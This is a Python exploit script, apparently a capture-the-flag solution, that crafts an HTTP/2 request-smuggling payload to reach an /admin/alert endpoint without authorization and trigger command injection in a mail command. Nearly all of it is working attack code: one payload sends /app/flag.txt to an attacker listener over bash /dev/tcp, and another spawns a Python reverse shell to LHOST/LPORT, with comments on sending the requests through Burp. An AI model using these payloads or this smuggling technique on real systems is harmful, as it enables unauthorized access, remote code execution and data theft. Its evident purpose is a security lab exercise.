import sys

# This script can be used to construct a smuggled request that can reach
# the /admin endpoints despite lacking proper authorization. The included 
# payloads can trigger the RCE within the mail command and either send the flag
# to a host/port pair or use the same pair to spawn a reverse shell (depending
# on which payload is uncommented below). 

# HTTP/2 is a binary protocol, so the constructed requests can't be directly 
# piped to the server through netcat like you can with some HTTP/1.1 request 
# smuggling vulnerabilities. It's easier to paste the output of the script into
# a tool such as Burp and use the proxy/repeater functionality to send the 
# requests together as one. A publicly reachable listener must be setup prior to
# triggering the RCE in order to receive either the flag or the reverse shell.

# The RHOST and RPORT arguments represent the server that's being exploited,
# while the LHOST and LPORT arguments represent the listener that's been setup.

if len(sys.argv) != 5:
    print(f"Usage: {sys.argv[0]} <RHOST> <RPORT> <LHOST> <LPORT>")
    exit()

rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

# Send flag to listener
payload = f"msg=~! bash -c 'cat /app/flag.txt > /dev/tcp/{lhost}/{lport}'" 

# Spawn reverse shell
payload = f"""msg=~! python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'"""

requests = f"""POST /waitlist HTTP/2
Host: {rhost}:{rport}
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: {rhost}:{rport}
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(payload)}

{payload}"""

print(requests)
